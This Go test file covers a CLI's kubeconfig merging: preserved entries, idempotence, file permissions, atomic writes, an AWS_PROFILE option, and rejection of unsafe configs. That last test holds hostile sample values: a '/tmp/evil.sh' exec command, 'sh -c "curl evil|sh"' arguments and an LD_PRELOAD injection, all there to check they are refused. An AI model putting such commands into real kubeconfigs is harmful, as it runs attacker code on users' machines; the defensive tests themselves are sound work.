package kubeconfig

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const incoming = `apiVersion: v1
kind: Config
clusters:
  - name: afs
    cluster:
      server: https://EXAMPLE.gr7.us-east-1.eks.amazonaws.com
      certificate-authority-data: LS0tLS1CRUdJTg==
contexts:
  - name: afs-payments
    context: {cluster: afs, namespace: afs-payments, user: afs}
current-context: afs-payments
users:
  - name: afs
    user:
      exec:
        apiVersion: client.authentication.k8s.io/v1beta1
        command: aws
        args: [eks, get-token, --cluster-name, afs, --region, us-east-1]
`

const existing = `# my clusters
apiVersion: v1
kind: Config
preferences: {colors: true}
clusters:
  - name: dev
    cluster: {server: https://dev.example.com}
  - name: afs
    cluster: {server: https://OLD.example.com}
contexts:
  - name: dev
    context: {cluster: dev, user: dev}
  - name: afs-payments
    context: {cluster: afs, namespace: old, user: afs}
current-context: dev
users:
  - name: dev
    user: {token: dev-token}
  - name: afs
    user: {token: stale}
`

func count(s, sub string) int { return strings.Count(s, sub) }

// CLI-16: other contexts, clusters and users survive; same-named entries are replaced.
func TestMergeKeepsOtherContexts(t *testing.T) {
	out, cur, err := Merge([]byte(existing), []byte(incoming), Options{})
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	for _, keep := range []string{"name: dev", "https://dev.example.com", "token: dev-token", "preferences:", "colors: true"} {
		if !strings.Contains(s, keep) {
			t.Errorf("lost %q:\n%s", keep, s)
		}
	}
	for _, gone := range []string{"OLD.example.com", "namespace: old", "token: stale"} {
		if strings.Contains(s, gone) {
			t.Errorf("kept the replaced entry %q:\n%s", gone, s)
		}
	}
	if !strings.Contains(s, "EXAMPLE.gr7.us-east-1.eks.amazonaws.com") || cur != "afs-payments" || !strings.Contains(s, "current-context: afs-payments") {
		t.Errorf("incoming not merged (context %q):\n%s", cur, s)
	}
}

// CLI-US-11.2: merging twice leaves one context.
func TestMergeTwiceOneContext(t *testing.T) {
	once, _, err := Merge([]byte(existing), []byte(incoming), Options{})
	if err != nil {
		t.Fatal(err)
	}
	twice, _, err := Merge(once, []byte(incoming), Options{})
	if err != nil {
		t.Fatal(err)
	}
	if count(string(twice), "name: afs-payments") != 1 || count(string(twice), "- name: afs\n") != 2 { // one cluster, one user
		t.Errorf("duplicated entries:\n%s", twice)
	}
	if string(once) != string(twice) {
		t.Errorf("a second merge changed the file:\n%s\n---\n%s", once, twice)
	}
	empty, _, err := Merge(nil, []byte(incoming), Options{})
	if err != nil || count(string(empty), "name: afs-payments") != 1 {
		t.Fatalf("empty base: %v\n%s", err, empty)
	}
}

// CLI-16: a new file is 0600 (and its directory 0700).
func TestNewFile0600(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".kube", "config")
	res, err := Apply(path, []byte(incoming), Options{})
	if err != nil || !res.Created || res.Wide {
		t.Fatalf("%+v %v", res, err)
	}
	st, _ := os.Stat(path)
	if st.Mode().Perm() != 0o600 {
		t.Errorf("mode %v", st.Mode().Perm())
	}
	if d, _ := os.Stat(filepath.Dir(path)); d.Mode().Perm() != 0o700 {
		t.Errorf("dir mode %v", d.Mode().Perm())
	}
}

// CLI-16: an existing file keeps its mode; one wider than 0600 is reported so the CLI can warn.
func TestExistingModeKeptWarnWide(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config")
	if err := os.WriteFile(path, []byte(existing), 0o644); err != nil { //nolint:gosec // the test needs a wide file
		t.Fatal(err)
	}
	if err := os.Chmod(path, 0o644); err != nil { //nolint:gosec // the test needs a wide file
		t.Fatal(err)
	}
	res, err := Apply(path, []byte(incoming), Options{})
	if err != nil || res.Created || !res.Wide || res.Mode != 0o644 {
		t.Fatalf("%+v %v", res, err)
	}
	if st, _ := os.Stat(path); st.Mode().Perm() != 0o644 {
		t.Errorf("mode changed to %v", st.Mode().Perm())
	}
	narrow := filepath.Join(t.TempDir(), "config")
	if err := os.WriteFile(narrow, []byte(existing), 0o600); err != nil {
		t.Fatal(err)
	}
	if res, err := Apply(narrow, []byte(incoming), Options{}); err != nil || res.Wide {
		t.Fatalf("0600 file: %+v %v", res, err)
	}
}

// CLI-16: the write is atomic: a failing final step leaves the original untouched and no temp file behind.
func TestAtomicWrite(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config")
	if err := os.WriteFile(path, []byte(existing), 0o600); err != nil {
		t.Fatal(err)
	}
	old := rename
	rename = func(string, string) error { return errors.New("disk full") }
	defer func() { rename = old }()
	if _, err := Apply(path, []byte(incoming), Options{}); err == nil {
		t.Fatal("expected the write to fail")
	}
	got, _ := os.ReadFile(path) //nolint:gosec // test file
	if string(got) != existing {
		t.Errorf("the original changed:\n%s", got)
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 1 {
		t.Errorf("leftover files: %v", entries)
	}
	rename = old
	if _, err := Apply(path, []byte(incoming), Options{}); err != nil {
		t.Fatal(err)
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 1 {
		t.Errorf("leftover files after success: %v", entries)
	}
}

// CLI-16: --aws-profile adds AWS_PROFILE to the exec env block, replacing an earlier value.
func TestExecEnvAWSProfile(t *testing.T) {
	out, _, err := Merge(nil, []byte(incoming), Options{AWSProfile: "ops"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out), "name: AWS_PROFILE") || !strings.Contains(string(out), "value: ops") {
		t.Fatalf("no env:\n%s", out)
	}
	again, _, err := Merge(out, []byte(incoming), Options{AWSProfile: "prod"})
	if err != nil || count(string(again), "AWS_PROFILE") != 1 || !strings.Contains(string(again), "value: prod") {
		t.Fatalf("%v\n%s", err, again)
	}
	plain, _, _ := Merge(nil, []byte(incoming), Options{})
	if strings.Contains(string(plain), "AWS_PROFILE") {
		t.Error("env added without --aws-profile")
	}
}

func TestMergeRejectsNonMapping(t *testing.T) {
	if _, _, err := Merge(nil, []byte("- a\n- b\n"), Options{}); err == nil {
		t.Error("a list is not a kubeconfig")
	}
	if _, _, err := Merge([]byte("- a\n"), []byte(incoming), Options{}); err == nil {
		t.Error("an existing list is not a kubeconfig")
	}
	if _, err := Apply(filepath.Join(t.TempDir(), "d", "c"), []byte(": : :"), Options{}); err == nil {
		t.Error("invalid YAML accepted")
	}
}

// FR-014: the service's kubeconfig is checked before it is merged; a hostile one changes nothing.
func TestMergeRefusesUnsafeIncomingKubeconfig(t *testing.T) {
	cases := map[string]string{
		"hostile command":      strings.Replace(incoming, "command: aws", "command: /tmp/evil.sh", 1),
		"command with path":    strings.Replace(incoming, "command: aws", "command: /usr/local/bin/aws", 1),
		"shell command":        strings.Replace(incoming, "command: aws", "command: sh", 1),
		"hostile args":         strings.Replace(incoming, "args: [eks, get-token, --cluster-name, afs, --region, us-east-1]", "args: [-c, \"curl evil|sh\"]", 1),
		"args do not start":    strings.Replace(incoming, "args: [eks, get-token,", "args: [s3, cp,", 1),
		"no args":              strings.Replace(incoming, "        args: [eks, get-token, --cluster-name, afs, --region, us-east-1]\n", "", 1),
		"static token user":    strings.Replace(incoming, "      exec:\n        apiVersion: client.authentication.k8s.io/v1beta1\n        command: aws\n        args: [eks, get-token, --cluster-name, afs, --region, us-east-1]\n", "      token: abc\n", 1),
		"non AFS user name":    strings.Replace(strings.Replace(incoming, "  - name: afs\n    user:", "  - name: dev\n    user:", 1), "user: afs}", "user: dev}", 1),
		"non AFS cluster name": strings.Replace(strings.Replace(incoming, "  - name: afs\n    cluster:", "  - name: dev\n    cluster:", 1), "cluster: afs,", "cluster: dev,", 1),
		"non AFS context name": strings.ReplaceAll(incoming, "afs-payments", "dev"),
		"prefix lookalike":     strings.Replace(incoming, "- name: afs-payments", "- name: afsx", 1),
		"env other than AWS_":  strings.Replace(incoming, "        command: aws\n", "        command: aws\n        env: [{name: LD_PRELOAD, value: /tmp/x.so}]\n", 1),
	}
	for name, in := range cases {
		t.Run(name, func(t *testing.T) {
			if in == incoming {
				t.Fatal("test case did not change the document")
			}
			dir := t.TempDir()
			path := filepath.Join(dir, "config")
			if err := os.WriteFile(path, []byte(existing), 0o600); err != nil {
				t.Fatal(err)
			}
			if _, _, err := Merge([]byte(existing), []byte(in), Options{}); err == nil {
				t.Fatal("merged")
			}
			if _, err := Apply(path, []byte(in), Options{}); err == nil {
				t.Fatal("applied")
			}
			if b, _ := os.ReadFile(path); string(b) != existing { //nolint:gosec // test file
				t.Errorf("file changed:\n%s", b)
			}
			entries, _ := os.ReadDir(dir)
			if len(entries) != 1 {
				t.Errorf("temporary file left behind: %v", entries)
			}
		})
	}
}

func TestMergeAcceptsAWSEnvAndDocumentedShape(t *testing.T) {
	in := strings.Replace(incoming, "        command: aws\n", "        command: aws\n        env: [{name: AWS_REGION, value: us-east-1}]\n", 1)
	if _, _, err := Merge(nil, []byte(in), Options{AWSProfile: "p"}); err != nil {
		t.Fatal(err)
	}
}

// A same-named entry of the user's that is not AFS's is never replaced.
func TestMergeNeverReplacesNonAFSEntries(t *testing.T) {
	out, _, err := Merge([]byte(existing), []byte(incoming), Options{})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out), "dev-token") || !strings.Contains(string(out), "https://dev.example.com") {
		t.Errorf("a non-AFS entry was lost:\n%s", out)
	}
}
